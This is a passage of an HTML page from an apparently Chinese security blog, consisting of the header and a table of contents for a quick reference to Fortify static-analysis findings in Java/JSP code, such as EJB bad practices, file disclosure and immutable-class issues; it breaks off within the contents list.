<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <meta name="renderer" content="webkit">
  <meta http-equiv="X-UA-Compatible" content="IE=edge" >
  <link rel="dns-prefetch" href="http://dayun.shystartree.online">
  <title>fortify扫描结果速查(Java/JSP) | qingyu&#39;s blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="fortify扫描结果速查(Java/JSP)-API误用，篇幅较大，推荐使用ctrl+F查找~~~">
<meta name="keywords" content="安全,fortify速查">
<meta property="og:type" content="article">
<meta property="og:title" content="fortify扫描结果速查(Java&#x2F;JSP)">
<meta property="og:url" content="http://dayun.shystartree.online/2020/12/25/fortify扫描结果速查(Java:JSP)/index.html">
<meta property="og:site_name" content="qingyu&#39;s blog">
<meta property="og:description" content="fortify扫描结果速查(Java/JSP)-API误用，篇幅较大，推荐使用ctrl+F查找~~~">
<meta property="og:updated_time" content="2020-12-25T07:59:34.748Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="fortify扫描结果速查(Java&#x2F;JSP)">
<meta name="twitter:description" content="fortify扫描结果速查(Java/JSP)-API误用，篇幅较大，推荐使用ctrl+F查找~~~">
  
    <link rel="alternative" href="/atom.xml" title="qingyu&#39;s blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link rel="stylesheet" type="text/css" href="/./main.0cf68a.css">
  <style type="text/css">
  
    #container.show {
      background: linear-gradient(200deg,#a0cfe4,#e8c37e);
    }
  </style>
  

  

</head>

<body>
  <div id="container" q-class="show:isCtnShow">
    <canvas id="anm-canvas" class="anm-canvas"></canvas>
    <div class="left-col" q-class="show:isShow">
      
<div class="overlay" style="background: #B0E0E6"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			<img src="/img/avatar.jpg" class="js-avatar">
		</a>
		<hgroup>
		  <h1 class="header-author"><a href="/">QingYu</a></h1>
		</hgroup>
		
		<p class="header-subtitle">越努力越幸运</p>
		

		<nav class="header-menu">
			<ul>
			
				<li><a href="/">博客主页</a></li>
	        
				<li><a href="/tags/安全/">信息安全</a></li>
	        
				<li><a href="/tags/随记/">灵感随记</a></li>
	        
			</ul>
		</nav>
		<nav class="header-smart-menu">
    		
    			
    			<a q-on="click: openSlider(e, 'innerArchive')" href="javascript:void(0)">文章搜搜</a>
    			
            
    			
    			<a q-on="click: openSlider(e, 'friends')" href="javascript:void(0)">友情链接</a>
    			
            
    			
    			<a q-on="click: openSlider(e, 'aboutme')" href="javascript:void(0)">About me</a>
    			
            
		</nav>
		<nav class="header-nav">
			<div class="social">
				
					<a class="github" target="_blank" href="https://github.com/shystartree/" title="github"><i class="icon-github"></i></a>
		        
					<a class="weibo" target="_blank" href="https://weibo.com/qingyu520" title="weibo"><i class="icon-weibo"></i></a>
		        
					<a class="rss" target="_blank" href="http://blog.shystartree.online/atom.xml" title="rss"><i class="icon-rss"></i></a>
		        
			</div>
		</nav>
	</header>		
</div>

    </div>
    <div class="mid-col" q-class="show:isShow,hide:isShow|isFalse">
      
<nav id="mobile-nav">
  	<div class="overlay js-overlay" style="background: #B0E0E6"></div>
	<div class="btnctn js-mobile-btnctn">
  		<div class="slider-trigger list" q-on="click: openSlider(e)"><i class="icon icon-sort"></i></div>
	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
				<img src="/img/avatar.jpg" class="js-avatar">
			</div>
			<hgroup>
			  <h1 class="header-author js-header-author">QingYu</h1>
			</hgroup>
			
			<p class="header-subtitle"><i class="icon icon-quo-left"></i>越努力越幸运<i class="icon icon-quo-right"></i></p>
			
			
			
				
			
				
			
				
			
			
			
			<nav class="header-nav">
				<div class="social">
					
						<a class="github" target="_blank" href="https://github.com/shystartree/" title="github"><i class="icon-github"></i></a>
			        
						<a class="weibo" target="_blank" href="https://weibo.com/qingyu520" title="weibo"><i class="icon-weibo"></i></a>
			        
						<a class="rss" target="_blank" href="http://blog.shystartree.online/atom.xml" title="rss"><i class="icon-rss"></i></a>
			        
				</div>
			</nav>

			<nav class="header-menu js-header-menu">
				<ul style="width: 70%">
				
				
					<li style="width: 33.333333333333336%"><a href="/">博客主页</a></li>
		        
					<li style="width: 33.333333333333336%"><a href="/tags/安全/">信息安全</a></li>
		        
					<li style="width: 33.333333333333336%"><a href="/tags/随记/">灵感随记</a></li>
		        
				</ul>
			</nav>
		</header>				
	</div>
	<div class="mobile-mask" style="display:none" q-show="isShow"></div>
</nav>

      <div id="wrapper" class="body-wrap">
        <div class="menu-l">
          <div class="canvas-wrap">
            <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
          </div>
          <div id="js-content" class="content-ll">
            <article id="post-fortify扫描结果速查(Java:JSP)" class="article article-type-post " itemscope itemprop="blogPost">
  <div class="article-inner">
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      fortify扫描结果速查(Java/JSP)
    </h1>
  



        
        
        <!-- 不蒜子统计 -->
        <span id="busuanzi_container_page_pv" style='display:none' class="archive-article-date">
              <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次
        </span>

<a href="/2020/12/25/fortify扫描结果速查(Java:JSP)/" class="archive-article-date">
  	<time datetime="2020-12-25T04:00:01.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-12-25</time>
</a>
        
      </header>
    
    <!-- 目录内容 -->

    <p class="show-toc-btn" id="show-toc-btn" onclick="showToc();" style="display:none">
          <span class="btn-bg"></span>
          <span class="btn-text">文章导航</span>
          </p>
  <div id="toc-article" class="toc-article">
      <span id="toc-close" class="toc-close" title="隐藏导航" onclick="showBtn();">×</span>
    <strong class="toc-title">文章目录</strong>
           <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Java-JSP"><span class="toc-number">1.</span> <span class="toc-text">Java/JSP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#API误用"><span class="toc-number">1.1.</span> <span class="toc-text">API误用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ADF-Faces-Bad-Practices-unsecure-Attribute"><span class="toc-number">1.1.1.</span> <span class="toc-text">ADF Faces Bad Practices: unsecure Attribute</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION"><span class="toc-number">1.1.1.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS"><span class="toc-number">1.1.1.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES"><span class="toc-number">1.1.1.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Android-Bad-Practices-Use-of-File-Scheme-Cookies"><span class="toc-number">1.1.2.</span> <span class="toc-text">Android Bad Practices: Use of File Scheme Cookies</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-1"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-1"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-1"><span class="toc-number">1.1.2.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-1"><span class="toc-number">1.1.2.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Castor-Bad-Practices-Query-Mode-Not-Read-Only"><span class="toc-number">1.1.3.</span> <span class="toc-text">Castor Bad Practices: Query Mode Not Read-Only</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-2"><span class="toc-number">1.1.3.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-2"><span class="toc-number">1.1.3.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-2"><span class="toc-number">1.1.3.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-2"><span class="toc-number">1.1.3.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Castor-Bad-Practices-Unspecified-Query-Mode"><span class="toc-number">1.1.4.</span> <span class="toc-text">Castor Bad Practices: Unspecified Query Mode</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-3"><span class="toc-number">1.1.4.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-3"><span class="toc-number">1.1.4.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-3"><span class="toc-number">1.1.4.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-3"><span class="toc-number">1.1.4.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Code-Correctness-Call-to-System-gc"><span class="toc-number">1.1.5.</span> <span class="toc-text">Code Correctness: Call to System.gc()</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-4"><span class="toc-number">1.1.5.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-4"><span class="toc-number">1.1.5.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-4"><span class="toc-number">1.1.5.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-4"><span class="toc-number">1.1.5.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Code-Correctness-Class-Does-Not-Implement-equals"><span class="toc-number">1.1.6.</span> <span class="toc-text">Code Correctness: Class Does Not Implement equals</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-5"><span class="toc-number">1.1.6.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-5"><span class="toc-number">1.1.6.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-5"><span class="toc-number">1.1.6.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-5"><span class="toc-number">1.1.6.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Code-Correctness-Erroneous-finalize-Method"><span class="toc-number">1.1.7.</span> <span class="toc-text">Code Correctness: Erroneous finalize() Method</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-6"><span class="toc-number">1.1.7.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-6"><span class="toc-number">1.1.7.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-6"><span class="toc-number">1.1.7.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-6"><span class="toc-number">1.1.7.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Code-Correctness-Incorrect-Serializable-Method-Signature"><span class="toc-number">1.1.8.</span> <span class="toc-text">Code Correctness: Incorrect Serializable Method Signature</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-7"><span class="toc-number">1.1.8.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-7"><span class="toc-number">1.1.8.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-7"><span class="toc-number">1.1.8.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-7"><span class="toc-number">1.1.8.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Code-Correctness-Multiple-Stream-Commits"><span class="toc-number">1.1.9.</span> <span class="toc-text">Code Correctness: Multiple Stream Commits</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-8"><span class="toc-number">1.1.9.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-8"><span class="toc-number">1.1.9.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-8"><span class="toc-number">1.1.9.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-8"><span class="toc-number">1.1.9.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Code-Correctness-Negative-Content-Length"><span class="toc-number">1.1.10.</span> <span class="toc-text">Code Correctness: Negative Content-Length</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-9"><span class="toc-number">1.1.10.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-9"><span class="toc-number">1.1.10.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-9"><span class="toc-number">1.1.10.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-9"><span class="toc-number">1.1.10.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Code-Correctness-toString-on-Array"><span class="toc-number">1.1.11.</span> <span class="toc-text">Code Correctness: toString on Array</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-10"><span class="toc-number">1.1.11.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-10"><span class="toc-number">1.1.11.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-10"><span class="toc-number">1.1.11.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-10"><span class="toc-number">1.1.11.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Dangerous-Field"><span class="toc-number">1.1.12.</span> <span class="toc-text">Dangerous Field</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-11"><span class="toc-number">1.1.12.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-11"><span class="toc-number">1.1.12.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-11"><span class="toc-number">1.1.12.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Dangerous-Method"><span class="toc-number">1.1.13.</span> <span class="toc-text">Dangerous Method</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-12"><span class="toc-number">1.1.13.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-12"><span class="toc-number">1.1.13.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-12"><span class="toc-number">1.1.13.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-11"><span class="toc-number">1.1.13.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Dangerous-Type"><span class="toc-number">1.1.14.</span> <span class="toc-text">Dangerous Type</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-13"><span class="toc-number">1.1.14.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-13"><span class="toc-number">1.1.14.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-13"><span class="toc-number">1.1.14.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-12"><span class="toc-number">1.1.14.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EJB-Bad-Practices-Use-of-AWT-Swing"><span class="toc-number">1.1.15.</span> <span class="toc-text">EJB Bad Practices: Use of AWT/Swing</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-14"><span class="toc-number">1.1.15.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-14"><span class="toc-number">1.1.15.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-14"><span class="toc-number">1.1.15.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-13"><span class="toc-number">1.1.15.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EJB-Bad-Practices-Use-of-Class-Loader"><span class="toc-number">1.1.16.</span> <span class="toc-text">EJB Bad Practices: Use of Class Loader</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-15"><span class="toc-number">1.1.16.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-15"><span class="toc-number">1.1.16.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-15"><span class="toc-number">1.1.16.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-14"><span class="toc-number">1.1.16.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EJB-Bad-Practices-Use-of-Sockets"><span class="toc-number">1.1.17.</span> <span class="toc-text">EJB Bad Practices: Use of Sockets</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-16"><span class="toc-number">1.1.17.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-16"><span class="toc-number">1.1.17.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-16"><span class="toc-number">1.1.17.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EJB-Bad-Practices-Use-of-Synchronization-Primitives"><span class="toc-number">1.1.18.</span> <span class="toc-text">EJB Bad Practices: Use of Synchronization Primitives</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-17"><span class="toc-number">1.1.18.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-17"><span class="toc-number">1.1.18.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-17"><span class="toc-number">1.1.18.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-15"><span class="toc-number">1.1.18.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EJB-Bad-Practices-Use-of-java-io"><span class="toc-number">1.1.19.</span> <span class="toc-text">EJB Bad Practices: Use of java.io</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-18"><span class="toc-number">1.1.19.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-18"><span class="toc-number">1.1.19.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-18"><span class="toc-number">1.1.19.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-16"><span class="toc-number">1.1.19.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#File-Disclosure-J2EE"><span class="toc-number">1.1.20.</span> <span class="toc-text">File Disclosure: J2EE</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-19"><span class="toc-number">1.1.20.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-19"><span class="toc-number">1.1.20.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-19"><span class="toc-number">1.1.20.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-17"><span class="toc-number">1.1.20.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#File-Disclosure-Spring"><span class="toc-number">1.1.21.</span> <span class="toc-text">File Disclosure: Spring</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-20"><span class="toc-number">1.1.21.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-20"><span class="toc-number">1.1.21.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-20"><span class="toc-number">1.1.21.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-18"><span class="toc-number">1.1.21.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#File-Disclosure-Spring-Webflow"><span class="toc-number">1.1.22.</span> <span class="toc-text">File Disclosure: Spring Webflow</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-21"><span class="toc-number">1.1.22.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-21"><span class="toc-number">1.1.22.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-21"><span class="toc-number">1.1.22.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-19"><span class="toc-number">1.1.22.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#File-Disclosure-Struts"><span class="toc-number">1.1.23.</span> <span class="toc-text">File Disclosure: Struts</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-22"><span class="toc-number">1.1.23.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-22"><span class="toc-number">1.1.23.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-22"><span class="toc-number">1.1.23.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-20"><span class="toc-number">1.1.23.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Immutable-Classes-Field-Mutation"><span class="toc-number">1.1.24.</span> <span class="toc-text">Immutable Classes: Field Mutation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-23"><span class="toc-number">1.1.24.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-23"><span class="toc-number">1.1.24.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-23"><span class="toc-number">1.1.24.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-21"><span class="toc-number">1.1.24.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Immutable-Classes-Non-final-Fields"><span class="toc-number">1.1.25.</span> <span class="toc-text">Immutable Classes: Non-final Fields</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-24"><span class="toc-number">1.1.25.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-24"><span class="toc-number">1.1.25.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-24"><span class="toc-number">1.1.25.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-22"><span class="toc-number">1.1.25.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Immutable-Classes-Public-Mutable-Fields"><span class="toc-number">1.1.26.</span> <span class="toc-text">Immutable Classes: Public Mutable Fields</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-25"><span class="toc-number">1.1.26.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-25"><span class="toc-number">1.1.26.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-25"><span class="toc-number">1.1.26.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-23"><span class="toc-number">1.1.26.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#J2EE-Bad-Practices-getConnection"><span class="toc-number">1.1.27.</span> <span class="toc-text">J2EE Bad Practices: getConnection()</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-26"><span class="toc-number">1.1.27.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-26"><span class="toc-number">1.1.27.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-26"><span class="toc-number">1.1.27.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-24"><span class="toc-number">1.1.27.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#J2EE-Bad-Practices-Sockets"><span class="toc-number">1.1.28.</span> <span class="toc-text">J2EE Bad Practices: Sockets</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-27"><span class="toc-number">1.1.28.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-27"><span class="toc-number">1.1.28.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-27"><span class="toc-number">1.1.28.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-25"><span class="toc-number">1.1.28.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Mass-Assignment-Insecure-Binder-Configuration"><span 